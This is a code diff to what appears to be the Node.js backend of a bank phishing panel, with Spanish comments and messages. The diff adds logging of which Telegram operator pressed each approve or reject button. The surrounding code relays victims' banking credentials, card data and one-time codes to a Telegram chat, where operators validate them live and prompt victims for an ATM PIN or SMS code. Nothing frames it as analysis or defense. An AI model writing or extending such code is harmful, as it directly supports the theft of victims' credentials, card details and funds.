@@ -1,3 +1,4 @@
+
 const express = require('express');
 const cors = require('cors');
 const XLSX = require('xlsx');
@@ -82,6 +83,14 @@ async function tgAnswerCallback(callbackQueryId, text) {
     try {
         await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
     } catch {}
+}
+
+// 👤 NUEVO: formatea al usuario que oprimió el botón
+function formatearUsuarioTelegram(from) {
+    if (!from) return '—';
+    const nombre = [from.first_name, from.last_name].filter(Boolean).join(' ') || 'Sin nombre';
+    const username = from.username ? `@${from.username}` : 'sin @';
+    return `${nombre} (${username}) — ID: <code>${from.id}</code>`;
 }
 
 // ============================================================
@@ -468,12 +477,13 @@ async function procesarUpdate(update) {
             }
         }
 
-        // 📌 Callbacks (botones inline) — MISMA LÓGICA ORIGINAL
+        // 📌 Callbacks (botones inline) — CON IDENTIFICACIÓN DE QUIEN OPRIME
         const cq = update.callback_query;
         if (!cq || !cq.data) return;
 
         const [accion, solicitud_id] = cq.data.split(':');
         const msgId = cq.message?.message_id;
+        const quienOprimio = formatearUsuarioTelegram(cq.from);
 
         const pago = pagosPendientes.get(solicitud_id);
         if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
@@ -484,14 +494,14 @@ async function procesarUpdate(update) {
             if (!estaEnFaseOTP) {
                 pago.estado = 'aprobado_credenciales';
                 await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + textoPasoCredenciales(pago));
+                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Aprobado por:</b> ${quienOprimio}`);
             } else {
                 const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                 pago.estado = 'aprobado';
                 pago.fase_actual = 'completado';
                 pago.redirigir_a = archivo;
                 await tgAnswerCallback(cq.id, '✅ Pago aprobado');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + textoPasoOTP(pago));
+                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + textoPasoOTP(pago) + `\n\n👤 <b>Aprobado por:</b> ${quienOprimio}`);
             }
         } else if (accion === 'rechazar') {
             const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
@@ -500,34 +510,34 @@ async function procesarUpdate(update) {
             await tgAnswerCallback(cq.id, '❌ Rechazado');
             if (msgId) {
                 const texto = estaEnFaseOTP ? textoPasoOTP(pago) : textoPasoCredenciales(pago);
-                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
+                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}\n\n👤 <b>Rechazado por:</b> ${quienOprimio}`);
             }
         } else if (accion === 'clave_atm') {
             pago.estado = 'aprobado_credenciales';
             await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
             if (msgId) {
-                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
+                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Solicitado por:</b> ${quienOprimio}`);
             }
         } else if (accion === 'sms') {
             pago.requiere_sms = true;
             pago.estado = 'aprobado_credenciales';
             await tgAnswerCallback(cq.id, '📱 Se solicitó código por SMS al cliente');
             if (msgId) {
-                await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
+                await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Solicitado por:</b> ${quienOprimio}`);
             }
         } else if (accion === 'error_cc') {
             pago.estado = 'error_cc';
             pago.motivo_rechazo = 'Error en los datos de la tarjeta (CC).';
             await tgAnswerCallback(cq.id, '💳 Error CC registrado');
             if (msgId) {
-                await tgEditMessage(msgId, `💳 <b>ERROR CC</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente volver a ingresar los datos de la tarjeta.`);
+                await tgEditMessage(msgId, `💳 <b>ERROR CC</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente volver a ingresar los datos de la tarjeta.\n\n👤 <b>Reportado por:</b> ${quienOprimio}`);
             }
         } else if (accion === 'error_usuario') {
             pago.estado = 'rechazado_user_error';
             pago.motivo_rechazo = 'Error de usuario: credenciales no coinciden.';
             await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado');
             if (msgId) {
-                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.`);
+                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.\n\n👤 <b>Reportado por:</b> ${quienOprimio}`);
             }
         }
     } catch (err) {
